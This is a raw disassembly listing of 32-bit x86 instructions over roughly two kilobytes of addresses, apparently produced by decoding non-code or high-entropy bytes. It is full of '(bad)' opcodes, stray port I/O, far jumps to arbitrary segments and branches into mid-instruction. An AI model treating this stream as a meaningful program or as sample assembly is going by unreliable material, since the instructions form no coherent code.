  410a64:	xchg   ch,bh
  410a66:	push   ss
  410a67:	int    0x9e
  410a69:	cmp    DWORD PTR [eax-0x51],0xd9e8ea6a
  410a70:	dec    ebp
  410a71:	fwait
  410a72:	add    ah,bl
  410a74:	mov    bh,0x47
  410a76:	mov    al,ds:0xed7b5564
  410a7b:	lods   al,BYTE PTR ds:[esi]
  410a7c:	push   edi
  410a7d:	sbb    eax,0xfc9a67c6
  410a82:	pop    ecx
  410a83:	shl    DWORD PTR [edx],0x5d
  410a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a87:	push   edx
  410a88:	mov    al,ds:0xe0b8cad
  410a8d:	in     eax,dx
  410a8e:	sbb    eax,0x459bfa32
  410a93:	inc    ebp
  410a94:	push   esi
  410a95:	(bad)  
  410a96:	(bad)  
  410a97:	sar    DWORD PTR [esi-0x444b3327],cl
  410a9d:	aaa    
  410a9e:	xchg   esi,eax
  410a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aa0:	cmp    al,0xea
  410aa2:	sti    
  410aa3:	add    bl,BYTE PTR [eax]
  410aa5:	popa   
  410aa6:	xor    DWORD PTR [ebp+eiz*8-0x36],0xffffffed
  410aab:	mov    ds:0xf0b74dc9,al
  410ab0:	shl    BYTE PTR [esi],1
  410ab2:	aaa    
  410ab3:	(bad)  
  410ab4:	dec    ecx
  410ab5:	cmp    al,0x90
  410ab7:	(bad)  
  410ab8:	xchg   ebx,eax
  410ab9:	mov    eax,ds:0x1d86fe02
  410abe:	(bad)  
  410abf:	in     eax,0xbf
  410ac1:	xchg   edi,eax
  410ac2:	xchg   ebp,eax
  410ac3:	mov    al,ds:0x5de32169
  410ac8:	outs   dx,DWORD PTR ds:[esi]
  410ac9:	stc    
  410aca:	jb     0x410a82
  410acc:	aad    0x84
  410ace:	jno    0x410abf
  410ad0:	fbld   TBYTE PTR [edi-0x7]
  410ad3:	out    dx,al
  410ad4:	lods   eax,DWORD PTR ds:[esi]
  410ad5:	sub    eax,0x8c6df173
  410ada:	mov    eax,0xed45d51b
  410adf:	fidiv  WORD PTR [eax]
  410ae1:	inc    ecx
  410ae2:	out    dx,al
  410ae3:	out    dx,al
  410ae4:	or     edx,DWORD PTR [ebp+0x34]
  410ae7:	pop    edi
  410ae8:	shl    DWORD PTR [eax],cl
  410aea:	jg     0x410b1a
  410aec:	sbb    DWORD PTR [eax-0x13],eax
  410aef:	inc    eax
  410af0:	or     ebp,DWORD PTR [eax-0x80]
  410af3:	mov    al,ds:0x1201bd41
  410af8:	addr16 mov bx,0xbffd
  410afd:	pop    es
  410afe:	inc    eax
  410aff:	mov    WORD PTR [ecx-0x63fa8c15],ds
  410b05:	mov    eax,ds:0x2cdfa9
  410b0a:	aad    0x47
  410b0c:	iret   
  410b0d:	jp     0x410b4a
  410b0f:	jg     0x410b90
  410b11:	mov    edx,esi
  410b13:	sub    DWORD PTR [edx],ecx
  410b15:	cmp    esi,DWORD PTR [ebp-0x29]
  410b18:	jecxz  0x410b86
  410b1a:	jae    0x410ad1
  410b1c:	jle    0x410b5d
  410b1e:	scas   al,BYTE PTR es:[edi]
  410b1f:	daa    
  410b20:	in     eax,dx
  410b21:	xor    DWORD PTR [esp+edi*4],edx
  410b24:	fisttp DWORD PTR [esi-0x2d]
  410b27:	cld    
  410b28:	push   eax
  410b29:	inc    edi
  410b2a:	stc    
  410b2b:	stos   BYTE PTR es:[edi],al
  410b2c:	or     BYTE PTR [ebx],bl
  410b2e:	fwait
  410b2f:	push   0xdd639f11
  410b34:	mov    ds:0x42268a01,eax
  410b39:	into   
  410b3a:	push   ebx
  410b3b:	out    0x2,al
  410b3d:	jne    0x410adb
  410b3f:	xchg   esi,eax
  410b40:	mov    BYTE PTR [eax+0x74181409],ah
  410b46:	outs   dx,BYTE PTR ds:[esi]
  410b47:	cld    
  410b48:	call   0x8bb9:0xb54ebe9d
  410b4f:	or     DWORD PTR [ebp+0x5a9f1528],edi
  410b55:	(bad)  
  410b56:	clc    
  410b57:	out    dx,eax
  410b58:	mov    ebx,0x47f765b5
  410b5d:	ror    DWORD PTR [edx+0x47],cl
  410b60:	and    DWORD PTR ds:0x3b4d276f,0xdb230bcf
  410b6a:	xchg   BYTE PTR [ecx-0x66],al
  410b6d:	leave  
  410b6e:	imul   edi,DWORD PTR [ecx+0x51007543],0x8994976d
  410b78:	fstp   DWORD PTR [edx]
  410b7a:	xor    DWORD PTR [ecx+esi*4-0x6688ec2d],ebp
  410b81:	mov    al,0x31
  410b83:	push   edi
  410b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b85:	lods   eax,DWORD PTR ds:[esi]
  410b86:	push   esp
  410b87:	dec    ebp
  410b88:	test   al,0xf1
  410b8a:	push   0x3d
  410b8c:	and    eax,0x83a89fe8
  410b91:	popf   
  410b92:	(bad)
  410b96:	adc    eax,0x298004f1
  410b9b:	out    0x58,al
  410b9d:	mov    esp,0xed51a544
  410ba2:	mov    eax,0xb7a84c4f
  410ba7:	xor    esp,ebx
  410ba9:	repz adc eax,0xab5abcfb
  410baf:	rol    DWORD PTR [ebx],cl
  410bb1:	and    DWORD PTR [eax],edx
  410bb3:	rcr    ebx,0x4a
  410bb6:	mov    esi,0x5ad3549d
  410bbb:	add    al,0xe7
  410bbd:	fcom   DWORD PTR [ecx-0x2895b44d]
  410bc3:	and    bh,BYTE PTR [edi+0x2e7143f0]
  410bc9:	rcl    BYTE PTR [edi-0x27],1
  410bcc:	call   0x9721dec0
  410bd1:	push   esp
  410bd2:	xchg   ecx,eax
  410bd3:	xchg   ebp,eax
  410bd4:	int    0xf
  410bd6:	cld    
  410bd7:	(bad)  
  410bd8:	push   0xa48268b5
  410bdd:	jbe    0x410bf1
  410bdf:	repz push ebp
  410be1:	push   ds
  410be2:	icebp  
  410be3:	out    0x36,al
  410be5:	enter  0xbb8f,0x18
  410be9:	sub    ebp,DWORD PTR [eax]
  410beb:	mov    al,ds:0xc46241bd
  410bf0:	jbe    0x410bde
  410bf2:	lods   al,BYTE PTR ds:[esi]
  410bf3:	pop    edx
  410bf4:	dec    ecx
  410bf5:	(bad)  
  410bf6:	bound  edi,QWORD PTR [ebp+0x33]
  410bf9:	xchg   ebx,eax
  410bfa:	lahf   
  410bfb:	imul   eax,DWORD PTR [edi-0x2b],0x1b
  410bff:	mov    ebx,0x4b96d72d
  410c04:	inc    edx
  410c05:	ja     0x410bb3
  410c07:	push   esp
  410c08:	aaa    
  410c09:	and    al,0x56
  410c0b:	push   esi
  410c0c:	jmp    0x410c37
  410c0e:	mov    bh,0xcf
  410c10:	fild   WORD PTR [ebp-0x1157a5e5]
  410c16:	jle    0x410bc2
  410c18:	into   
  410c19:	mov    WORD PTR ds:0x890dbf17,es
  410c1f:	test   dl,al
  410c21:	ins    BYTE PTR es:[edi],dx
  410c22:	xchg   ebp,eax
  410c23:	hlt    
  410c24:	mov    bx,0x9377
  410c28:	or     eax,0x82c82913
  410c2d:	mov    ss,WORD PTR [eax+0x5ed2ada2]
  410c33:	add    ch,cl
  410c35:	cld    
  410c36:	stos   BYTE PTR es:[edi],al
  410c37:	dec    edi
  410c38:	cmp    al,0xa9
  410c3a:	lea    esi,[edx+0x18679052]
  410c40:	daa    
  410c41:	in     al,dx
  410c42:	and    BYTE PTR [ecx-0x2ea2ee28],bh
  410c48:	push   0x6e5d7e6a
  410c4d:	stc    
  410c4e:	test   bl,bl
  410c50:	pop    edx
  410c51:	or     al,0x1f
  410c53:	(bad)  
  410c54:	or     al,0x9d
  410c56:	inc    esp
  410c57:	jl     0x410c0d
  410c59:	lea    ebp,[esp+eax*1]
  410c5c:	push   esi
  410c5d:	jp     0x410ccf
  410c5f:	leave  
  410c60:	push   ebx
  410c61:	adc    al,BYTE PTR [ecx+0x60]
  410c64:	icebp  
  410c65:	das    
  410c66:	jecxz  0x410c27
  410c68:	std    
  410c69:	mov    al,ds:0x3865cc27
  410c6e:	or     eax,0xd26f7c9b
  410c73:	pop    eax
  410c74:	ficomp DWORD PTR ds:0x6af1408d
  410c7a:	cmp    eax,0x1359f98a
  410c7f:	dec    ebx
  410c80:	pusha  
  410c81:	loop   0x410c70
  410c83:	fs xchg ecx,eax
  410c85:	ins    BYTE PTR es:[edi],dx
  410c86:	leave  
  410c87:	add    al,0x24
  410c89:	es clc 
  410c8b:	mov    cs,WORD PTR [ebx+0x6938d3d7]
  410c91:	mov    edx,0x38d31137
  410c96:	cmp    edx,edx
  410c98:	and    eax,0x6d279d91
  410c9d:	or     ch,BYTE PTR [ecx+0x4edf34ec]
  410ca3:	(bad)  
  410ca4:	push   ebx
  410ca5:	bound  esp,QWORD PTR [edi-0xd]
  410ca8:	fwait
  410ca9:	dec    eax
  410caa:	inc    BYTE PTR [ebx]
  410cac:	or     ah,al
  410cae:	in     eax,dx
  410caf:	add    ah,BYTE PTR [ebx-0x572944a7]
  410cb5:	adc    ah,ah
  410cb7:	pop    esi
  410cb8:	cmovge esp,eax
  410cbb:	scas   al,BYTE PTR es:[edi]
  410cbc:	push   ss
  410cbd:	inc    edi
  410cbe:	repnz add al,0x8d
  410cc1:	sahf   
  410cc2:	hlt    
  410cc3:	xor    eax,0xb443d1e6
  410cc8:	jb     0x410c81
  410cca:	pop    esp
  410ccb:	mov    bh,BYTE PTR [ebx*8+0x6a458958]
  410cd2:	adc    BYTE PTR [edi],ah
  410cd4:	stos   DWORD PTR es:[edi],eax
  410cd5:	adc    esp,0xffffffb2
  410cd8:	jo     0x410cd2
  410cda:	pop    edx
  410cdb:	cdq    
  410cdc:	push   esp
  410cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cde:	inc    edi
  410cdf:	(bad)  
  410ce0:	mov    bh,bl
  410ce2:	or     eax,0xed01f78f
  410ce7:	or     al,0x47
  410ce9:	mov    al,BYTE PTR [ebx]
  410ceb:	outs   dx,BYTE PTR ds:[esi]
  410cec:	(bad)  
  410ced:	or     al,0x5a
  410cef:	aas    
  410cf0:	imul   ebx,esp,0x9d7eaa43
  410cf6:	pop    ecx
  410cf7:	mov    esi,0xab8bda83
  410cfc:	jge    0x410d23
  410cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cff:	fwait
  410d00:	fwait
  410d01:	jne    0x410ccd
  410d03:	imul   ebx,DWORD PTR fs:[esi+edx*4+0x45],0x4
  410d09:	lods   eax,DWORD PTR ds:[esi]
  410d0a:	mov    esi,0xeb8a7114
  410d0f:	js     0x410d20
  410d11:	and    bl,ah
  410d13:	test   edx,0x46bf948e
  410d19:	add    ecx,ebx
  410d1b:	mov    ds:0x898549f9,eax
  410d20:	push   ebx
  410d21:	loop   0x410d74
  410d23:	fild   DWORD PTR [esi]
  410d25:	shr    BYTE PTR [edi-0x18],cl
  410d28:	sub    DWORD PTR [ebx],0x46924b61
  410d2e:	lods   eax,DWORD PTR ds:[esi]
  410d2f:	fldenv [ebp-0x6aaa1f57]
  410d35:	adc    DWORD PTR [edi+esi*1],edx
  410d38:	mov    bh,BYTE PTR [edx]
  410d3a:	mov    ebp,0xf4251954
  410d3f:	xchg   edi,eax
  410d40:	add    DWORD PTR [edi-0x5e],ecx
  410d43:	imul   ebp,ebp,0x1f
  410d46:	cmp    eax,0xff6969d2
  410d4b:	xlat   BYTE PTR ds:[ebx]
  410d4c:	push   es
  410d4d:	push   ebp
  410d4e:	repnz push ss
  410d50:	dec    eax
  410d51:	lds    eax,FWORD PTR [esi+eiz*4]
  410d54:	jle    0x410dc3
  410d56:	inc    ebp
  410d57:	sti    
  410d58:	pop    es
  410d59:	repz dec BYTE PTR [edx]
  410d5c:	inc    ebp
  410d5d:	jge    0x410d02
  410d5f:	mov    ebp,0xd8f687b4
  410d64:	es out dx,eax
  410d66:	mov    bl,0xe3
  410d68:	inc    esp
  410d69:	xor    ebp,DWORD PTR [eax+0x2b36ec1e]
  410d6f:	xor    esi,DWORD PTR [esi+0x115d5c11]
  410d75:	fcomp  DWORD PTR [eax-0x5d]
  410d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d79:	cld    
  410d7a:	mov    dh,0x3c
  410d7c:	dec    esi
  410d7d:	push   0x945a435d
  410d82:	jo     0x410d08
  410d84:	dec    esp
  410d85:	test   BYTE PTR [ebx],dl
  410d87:	jg     0x410d9b
  410d89:	cmp    eax,0x792ed7e0
  410d8e:	icebp  
  410d8f:	mov    dl,0xb8
  410d91:	inc    edx
  410d92:	cld    
  410d93:	cmp    BYTE PTR [ebx+0x7a689f77],ah
  410d99:	daa    
  410d9a:	bswap  edi
  410d9c:	sub    al,0xfb
  410d9e:	repnz xor cl,BYTE PTR [ebx]
  410da1:	xchg   edi,eax
  410da2:	xchg   DWORD PTR [ebx+0x47],ebx
  410da5:	mov    al,0x1e
  410da7:	and    DWORD PTR [ebp+0x59cdd82d],0xd96641d3
  410db1:	cdq    
  410db2:	mov    al,0x18
  410db4:	mov    bh,0x3f
  410db6:	popa   
  410db7:	test   al,0x1c
  410db9:	das    
  410dba:	pop    ebx
  410dbb:	adc    ebp,ebx
  410dbd:	jecxz  0x410d4d
  410dbf:	xor    BYTE PTR [ecx],ah
  410dc1:	hlt    
  410dc2:	aad    0xe9
  410dc4:	(bad)  
  410dc5:	adc    eax,DWORD PTR [edx+0x56]
  410dc8:	xor    DWORD PTR [edx+eax*4+0x57],0x75
  410dcd:	mov    dh,BYTE PTR [ecx-0x7d0aabb8]
  410dd3:	gs sbb al,0x79
  410dd6:	sub    al,bl
  410dd8:	push   ss
  410dd9:	dec    esi
  410dda:	out    0x91,eax
  410ddc:	cmp    dh,BYTE PTR [ecx-0x16d1d264]
  410de2:	std    
  410de3:	mov    ds:0x8010930d,al
  410de8:	xchg   edx,eax
  410de9:	test   eax,0x4d23ac29
  410dee:	xor    eax,DWORD PTR [esi+0x6bb00cc1]
  410df4:	gs jge 0x410e14
  410df7:	sbb    DWORD PTR [ebx+ebp*8],edx
  410dfa:	mov    eax,ds:0xba8b3546
  410dff:	je     0x410e4d
  410e01:	pop    edx
  410e02:	cdq    
  410e03:	retf   0x637e
  410e06:	jmp    DWORD PTR [ebx]
  410e08:	mov    WORD PTR [ebp+0x7bfc5175],cs
  410e0e:	popf   
  410e0f:	scas   al,BYTE PTR es:[edi]
  410e10:	lahf   
  410e11:	xor    al,0x7b
  410e13:	dec    esi
  410e14:	sbb    BYTE PTR [edx-0x3d88834],bl
  410e1a:	push   ebp
  410e1b:	mov    edx,0x7fe6ee21
  410e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e21:	push   es
  410e22:	push   ss
  410e23:	xchg   ecx,eax
  410e24:	shl    BYTE PTR [ebx],1
  410e26:	mov    dl,0xa4
  410e28:	adc    DWORD PTR [ecx-0x42c90642],ebx
  410e2e:	mov    ds:0x21fa22b,al
  410e33:	sbb    edx,DWORD PTR [esi+ebp*4+0x73]
  410e37:	pop    esp
  410e38:	jmp    0xde3d43d5
  410e3d:	cmp    al,0xd
  410e3f:	data16 adc ah,BYTE PTR [edi+eax*4]
  410e43:	loop   0x410e1c
  410e45:	mov    bh,0xc3
  410e47:	xor    DWORD PTR [esi],eax
  410e49:	(bad)  
  410e4a:	aad    0xeb
  410e4c:	bound  ebx,QWORD PTR [ebp-0x132472a1]
  410e52:	xor    DWORD PTR [ecx-0x4c98250e],0xa951bef3
  410e5c:	jb     0x410e38
  410e5e:	mov    edx,0x44358e1b
  410e63:	xchg   esp,eax
  410e64:	mov    edi,DWORD PTR [edx+0x5e]
  410e67:	outs   dx,BYTE PTR ds:[esi]
  410e68:	and    dl,ah
  410e6a:	mov    ch,0x46
  410e6c:	mov    ch,0xfe
  410e6e:	adc    esp,eax
  410e70:	mov    dh,0x4d
  410e72:	inc    esp
  410e73:	inc    edi
  410e74:	mov    ah,0x9a
  410e76:	push   ss
  410e77:	shl    DWORD PTR [ecx],cl
  410e79:	mov    ebx,DWORD PTR [edi+0x6f80fb5d]
  410e7f:	stos   BYTE PTR es:[edi],al
  410e80:	inc    ecx
  410e81:	mov    dh,0xa1
  410e83:	out    0xc7,eax
  410e85:	jno    0x410e78
  410e87:	shr    dl,1
  410e89:	mov    DWORD PTR [ecx+esi*4+0x7df01085],0x7d10d28b
  410e94:	pushf  
  410e95:	in     al,dx
  410e96:	dec    ebp
  410e97:	bound  esp,QWORD PTR [ebx+0x51]
  410e9a:	es ja  0x410e76
  410e9d:	leave  
  410e9e:	cld    
  410e9f:	test   dh,bh
  410ea1:	outs   dx,DWORD PTR ds:[esi]
  410ea2:	leave  
  410ea3:	pop    esi
  410ea4:	in     eax,0x68
  410ea6:	mov    bl,0x51
  410ea8:	dec    esi
  410ea9:	mov    bl,0xf5
  410eab:	ss enter 0x3c84,0x7
  410eb0:	sbb    ah,ch
  410eb2:	xchg   ecx,eax
  410eb3:	or     esp,DWORD PTR [esi+0x1]
  410eb6:	lds    eax,FWORD PTR [esi+0x4f07b5df]
  410ebc:	and    bh,BYTE PTR [esi+ecx*4+0x36ae5f8b]
  410ec3:	dec    edx
  410ec4:	(bad)
  410ec7:	enter  0x72b7,0x5f
  410ecb:	inc    esi
  410ecc:	xchg   esp,eax
  410ecd:	in     al,dx
  410ece:	mov    esp,0x39452e9
  410ed3:	jmp    0x788fbb95
  410ed8:	cdq    
  410ed9:	cwde   
  410eda:	ins    BYTE PTR es:[edi],dx
  410edb:	das    
  410edc:	js     0x410ed2
  410ede:	fnstcw WORD PTR [eax+ebp*8+0x31]
  410ee2:	sub    BYTE PTR [edi+ecx*1+0x774929ea],bh
  410ee9:	push   ecx
  410eea:	dec    ebp
  410eeb:	out    dx,eax
  410eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eed:	mov    edx,eax
  410eef:	or     BYTE PTR [ebx],bl
  410ef1:	push   0x4b
  410ef3:	les    ebx,FWORD PTR [esi+0x7a92c0ac]
  410ef9:	bound  eax,QWORD PTR [ebx-0x73]
  410efc:	ss and eax,0xa8820154
  410f02:	sbb    bl,BYTE PTR [esi-0x5696fcc1]
  410f08:	imul   edx,DWORD PTR [edi-0x7d],0xffffffb5
  410f0c:	adc    al,0x69
  410f0e:	(bad)  
  410f0f:	jmp    0x410e99
  410f11:	pop    eax
  410f12:	push   edi
  410f13:	loope  0x410f08
  410f15:	adc    BYTE PTR [edi+ebp*1-0x7bbbb95d],bh
  410f1c:	mov    eax,0x2b82058d
  410f21:	sti    
  410f22:	mov    eax,ds:0xcc901254
  410f27:	stc    
  410f28:	pop    ecx
  410f29:	adc    eax,0xda57f1a
  410f2e:	jnp    0x410f0f
  410f30:	gs push 0x48
  410f33:	jge    0x410f47
  410f35:	stc    
  410f36:	push   edx
  410f37:	jmp    0xa65b:0xd15a3ec0
  410f3e:	mov    esp,0xaed55b8b
  410f43:	xchg   al,al
  410f45:	imul   ebx,edi,0xffffffb7
  410f48:	sub    dh,BYTE PTR [eax-0x79]
  410f4b:	pop    esp
  410f4c:	cld    
  410f4d:	push   ds
  410f4e:	cmc    
  410f4f:	inc    edx
  410f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f51:	fstp   TBYTE PTR [eax-0x1af4e2d8]
  410f57:	jge    0x410f01
  410f59:	pop    ss
  410f5a:	inc    esi
  410f5b:	stc    
  410f5c:	mov    dh,0x80
  410f5e:	xor    al,0x4c
  410f60:	push   eax
  410f61:	xchg   BYTE PTR [esi],bh
  410f63:	jl     0x410f62
  410f65:	test   DWORD PTR [ebx],ebp
  410f67:	add    DWORD PTR [edi],ebp
  410f69:	and    DWORD PTR [eax+0x58],edi
  410f6c:	push   cs
  410f6d:	imul   ebp,DWORD PTR [eax-0x541e2b78],0xcb959677
  410f77:	sbb    BYTE PTR [ebx+0x511b7021],ah
  410f7d:	and    BYTE PTR [eax-0x134dfaf5],ah
  410f83:	or     eax,0xbf37d5d0
  410f88:	out    0x28,al
  410f8a:	cmp    ah,BYTE PTR [edx+0x4ed8c0a6]
  410f90:	pop    edi
  410f91:	cdq    
  410f92:	xor    eax,0xd55667c5
  410f97:	fstp   TBYTE PTR [esi-0x6bf721ab]
  410f9d:	cld    
  410f9e:	push   es
  410f9f:	out    dx,eax
  410fa0:	mov    ds:0xd7594559,eax
  410fa5:	jge    0x410f64
  410fa7:	lods   eax,DWORD PTR ds:[esi]
  410fa8:	stc    
  410fa9:	xchg   edi,eax
  410faa:	or     DWORD PTR [ebp+0x30e9fb5d],edx
  410fb0:	into   
  410fb1:	pop    es
  410fb2:	jl     0x411013
  410fb4:	fs jmp 0x1ccc:0x8055a6c7
  410fbc:	push   es
  410fbd:	ror    BYTE PTR [ecx+edx*4],cl
  410fc0:	push   0x53c244d8
  410fc5:	ds in  al,0xc7
  410fc8:	mov    bh,0x44
  410fca:	and    esp,DWORD PTR [ebp+0x3bc9d15b]
  410fd0:	jmp    0x895e5003
  410fd5:	(bad)  
  410fd6:	jle    0x410fbb
  410fd8:	sbb    eax,0xff2cdf50
  410fdd:	repnz imul bp,WORD PTR [esi+0x32],0xffa8
  410fe3:	jge    0x410f8e
  410fe5:	repnz and al,BYTE PTR [esi]
  410fe8:	sar    BYTE PTR [esi-0x61],1
  410feb:	mov    WORD PTR [ebx],?
  410fed:	dec    ebp
  410fee:	pop    esi
  410fef:	dec    ebp
  410ff0:	mov    esp,0x2d2b2989
  410ff5:	cdq    
  410ff6:	pop    esp
  410ff7:	and    bh,BYTE PTR [eax]
  410ff9:	test   DWORD PTR [ebx+0x1d],esp
  410ffc:	dec    ebp
  410ffd:	mov    BYTE PTR [esi-0x3c],0xf6
  411001:	mov    edi,0xe5bb797a
  411006:	fstp   DWORD PTR [ecx+0x26]
  411009:	sub    ah,BYTE PTR [esi-0x43]
  41100c:	xor    al,0x12
  41100e:	mov    dh,0xda
  411010:	outs   dx,DWORD PTR ds:[esi]
  411011:	aas    
  411012:	mov    edx,0x44d43130
  411017:	add    al,0x8a
  411019:	fwait
  41101a:	add    DWORD PTR [eax-0x29c70c34],esp
  411020:	fbld   TBYTE PTR [edx-0x502d8081]
  411026:	fwait
  411027:	lods   al,BYTE PTR ds:[esi]
  411028:	es xchg edx,eax
  41102a:	jbe    0x41106d
  41102c:	scas   eax,DWORD PTR es:[edi]
  41102d:	cli    
  41102e:	nop
  41102f:	bswap  ebx
  411031:	xchg   edx,eax
  411032:	dec    ebx
  411033:	jl     0x41104d
  411035:	ret    0xa3d8
  411038:	lea    ecx,[esi*1+0x23094b2c]
  41103f:	xchg   edi,eax
  411040:	mov    esp,0x8a41b2d7
  411045:	pop    edx
  411046:	mov    eax,0xcf6a301
  41104b:	or     ebp,DWORD PTR [ebx+0x33]
  41104e:	push   edx
  41104f:	dec    edx
  411050:	or     al,0x96
  411052:	mov    eax,0xc9a81abc
  411057:	jg     0x411007
  411059:	or     esi,ebp
  41105b:	add    al,0x19
  41105d:	adc    eax,0x967a7582
  411062:	repnz std 
  411064:	nop
  411065:	adc    ah,BYTE PTR ds:0x64232ec0
  41106b:	and    BYTE PTR [ebp-0x4c4a5a00],dl
  411071:	or     esi,eax
  411073:	aas    
  411074:	xor    eax,0x73beaa38
  411079:	ret    0x2854
  41107c:	xchg   esi,eax
  41107d:	shl    DWORD PTR [ecx-0x1531551b],1
  411083:	xchg   ecx,eax
  411084:	(bad)  
  411085:	lods   eax,DWORD PTR ds:[esi]
  411086:	xlat   BYTE PTR ds:[ebx]
  411087:	scas   al,BYTE PTR es:[edi]
  411088:	mov    gs,WORD PTR [ecx+eiz*2-0x74]
  41108c:	inc    eax
  41108d:	sub    al,0x1
  41108f:	retf   0xd959
  411092:	or     BYTE PTR [ebp-0x1e],ah
  411095:	sbb    al,0x33
  411097:	jae    0x41104c
  411099:	stos   BYTE PTR es:[edi],al
  41109a:	ja     0x41108c
  41109c:	mov    bh,0x1c
  41109e:	sub    al,0xf3
  4110a0:	or     dl,BYTE PTR [ecx+eiz*1+0x2]
  4110a4:	mov    esp,0x4a568bee
  4110a9:	xchg   ecx,eax
  4110aa:	test   BYTE PTR [eax-0x3dfbe372],0x97
  4110b1:	mov    dl,0x3a
  4110b3:	jne    0x4110af
  4110b5:	mov    dh,0x5b
  4110b7:	je     0x4110d0
  4110b9:	pop    esi
  4110ba:	je     0x411116
  4110bc:	jns    0x4110c9
  4110be:	fs rol ebx,0x30
  4110c2:	fdivrp st(7),st
  4110c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110c5:	push   es
  4110c6:	fdivr  QWORD PTR [ecx-0x46]
  4110c9:	push   ds
  4110ca:	cmc    
  4110cb:	loopne 0x41109b
  4110cd:	repnz mov eax,ds:0x2bccfc25
  4110d3:	mov    ebp,0x88006cf6
  4110d8:	add    WORD PTR [ebx],bp
  4110db:	cmp    esi,DWORD PTR [esi]
  4110dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110de:	jbe    0x4110b9
  4110e0:	je     0x411123
  4110e2:	push   esp
  4110e3:	adc    BYTE PTR [edi-0x148b1cc6],bh
  4110e9:	mov    eax,0xd7167d60
  4110ee:	mov    gs,WORD PTR [ecx]
  4110f0:	mov    ebx,DWORD PTR [eax]
  4110f2:	xchg   edi,eax
  4110f3:	and    eax,0xf2c6446a
  4110f8:	pop    ds
  4110f9:	cmp    BYTE PTR ds:0x518e69c1,cl
  4110ff:	inc    bh
  411101:	dec    esp
  411102:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411103:	(bad)  
  411105:	jp     0x4110e4
  411107:	shl    BYTE PTR [eax+0x7],cl
  41110a:	adc    cl,ch
  41110c:	imul   ecx,DWORD PTR [ecx+0x4475a6d2],0x3
  411113:	mov    edi,0x6a409707
  411118:	dec    ebx
  411119:	in     eax,0x6f
  41111b:	mov    ds:0x8972c741,eax
  411120:	or     al,0xfa
  411122:	or     ebp,DWORD PTR [edx+eiz*8]
  411125:	hlt    
  411126:	fstp   DWORD PTR [ebx]
  411128:	mov    cl,dh
  41112a:	retf   
  41112b:	pop    edi
  41112c:	rol    BYTE PTR [eax],1
  41112e:	popf   
  41112f:	call   0x7cdb:0x15fd518a
  411136:	psubw  mm6,QWORD PTR [ecx-0x7]
  41113a:	jbe    0x411110
  41113c:	stc    
  41113d:	jecxz  0x411188
  41113f:	lods   al,BYTE PTR ds:[esi]
  411140:	(bad)  
  411141:	xchg   ebp,eax
  411142:	jg     0x4110cc
  411144:	pop    edi
  411145:	shl    DWORD PTR [ebp+eiz*2-0x1a],0xf
  41114a:	fcom   DWORD PTR [ecx-0x496d6119]
  411150:	mov    edi,0x9189b731
  411155:	mov    ?,edx
  411157:	inc    ecx
  411158:	dec    ebp
  411159:	fsub   DWORD PTR [eax]
  41115b:	cli    
  41115c:	div    BYTE PTR [edi]
  41115e:	jns    0x4111a5
  411160:	shl    BYTE PTR es:[ecx-0x1967fb66],0xfb
  411168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411169:	mov    esi,0xdce74f82
  41116e:	jno    0x411157
  411170:	pop    eax
  411171:	jnp    0x4111aa
  411173:	push   esi
  411174:	loopne 0x4111e5
  411176:	mov    esi,0x4b651750
  41117b:	add    BYTE PTR [ebx-0x61],ah
  41117e:	push   ecx
  41117f:	push   0xf02e4c3
  411184:	sub    eax,esi
  411186:	pop    edi
  411187:	ds push ebx
  411189:	sbb    ebp,DWORD PTR [esi+0x64318cd7]
  41118f:	popf   
  411190:	test   DWORD PTR [edi-0x3bc3e9db],edi
  411196:	retf   
  411197:	or     ecx,DWORD PTR [ebx-0x18]
  41119a:	mov    ch,0x5b
  41119c:	in     al,0x57
  41119e:	or     al,0xad
  4111a0:	mov    eax,ds:0x2d753c05
  4111a5:	lock inc ecx
  4111a7:	pop    ss
  4111a8:	adc    al,0x82
  4111aa:	fldcw  WORD PTR [edi]
  4111ac:	lds    ebx,FWORD PTR [ebx]
  4111ae:	mov    ecx,0xf46a21cb
  4111b3:	push   ds
  4111b4:	xor    eax,0xf44d33a5
  4111b9:	push   cs
  4111ba:	push   eax
  4111bb:	jg     0x411156
  4111bd:	xchg   edi,eax
  4111be:	data16 std 
  4111c0:	jp     0x41121e
  4111c2:	ret    
  4111c3:	add    BYTE PTR [edi],ah
  4111c5:	jns    0x41120f
  4111c7:	push   edi
  4111c8:	mov    ah,0x9b
  4111ca:	jnp    0x41118b
  4111cc:	xchg   ecx,eax
  4111cd:	adc    bh,BYTE PTR [esp+esi*1-0x462c737a]
  4111d4:	mov    DWORD PTR [ebx+0x210d3b74],eax
  4111da:	retf   0xb610
  4111dd:	cmp    esp,DWORD PTR [esi+0x6e]
  4111e0:	mov    cl,0xfb
  4111e2:	cs jge 0x41122a
  4111e5:	pusha  
  4111e6:	shl    DWORD PTR [ebx],1
  4111e8:	cmp    eax,ebx
  4111ea:	push   es
  4111eb:	push   esp
  4111ec:	js     0x411202
  4111ee:	ret    
  4111ef:	and    DWORD PTR [ecx+0x5d],0x3183063e
  4111f6:	loope  0x411254
  4111f8:	dec    edx
  4111f9:	inc    eax
  4111fa:	in     al,dx
  4111fb:	cmp    edx,0x1a610bf8
  411201:	pop    ebx
  411202:	xchg   ebp,eax
  411203:	mov    al,0x89
  411205:	ret    
  411206:	cs dec esi
  411208:	and    al,0x1c
  41120a:	add    BYTE PTR [edi-0x76],0x7a
  41120e:	(bad)  
  411210:	xlat   BYTE PTR ds:[ebx]
  411211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411212:	sub    BYTE PTR [edx-0x62],0x78
  411216:	jecxz  0x41124e
  411218:	clc    
  411219:	sti    
  41121a:	jmp    0xfc09f3e4
  41121f:	sbb    BYTE PTR [ebx-0x2bd0cad4],dl
  411225:	imul   BYTE PTR ds:0x51c1bfc2
